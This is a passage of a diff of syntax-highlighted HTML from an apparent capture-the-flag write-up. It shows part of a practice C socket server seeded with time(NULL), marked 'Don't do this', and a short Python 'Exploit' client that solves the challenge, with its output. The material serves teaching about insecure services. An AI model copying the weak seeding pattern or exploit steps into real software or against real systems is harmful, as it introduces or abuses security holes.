-<span class="w">  </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="cm">/* Wait for socket activity and return */</span>
+<span class="w">  </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
 
-<span class="w">  </span><span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span><span class="w"></span>
-<span class="w">  </span><span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
+<span class="w">  </span><span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
 
-<span class="w">  </span><span class="cm">/* Don&#39;t do this :&gt; */</span><span class="w"></span>
-<span class="w">  </span><span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span><span class="w"></span>
+<span class="w">  </span><span class="cm">/* Don&#39;t do this :&gt; */</span>
+<span class="w">  </span><span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
 
-<span class="w">  </span><span class="n">run</span><span class="p">();</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="n">run</span><span class="p">();</span>
+<span class="p">}</span>
 </code></pre></div>
 <h3 id="exploit_2">Exploit<a class="headerlink" href="#exploit_2" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">struct</span>
@@ -3092,11 +3106,11 @@ you correctly sent the data
 <span class="nb">print</span> <span class="s1">&#39;Send: &#39;</span> <span class="o">+</span> <span class="n">ans</span>
 <span class="nb">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
 </code></pre></div>
-<div class="highlight"><pre><span></span><code>$ python /tmp/net.py 
-Receive: ��iv�c��&gt;
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>python<span class="w"> </span>/tmp/net.py<span class="w"> </span>
+Receive:<span class="w"> </span>��iv�c��&gt;
 z�P
-Send: ���
-you added them correctly
+Send:<span class="w"> </span>���
+you<span class="w"> </span>added<span class="w"> </span>them<span class="w"> </span>correctly
 </code></pre></div>
 
   <hr>
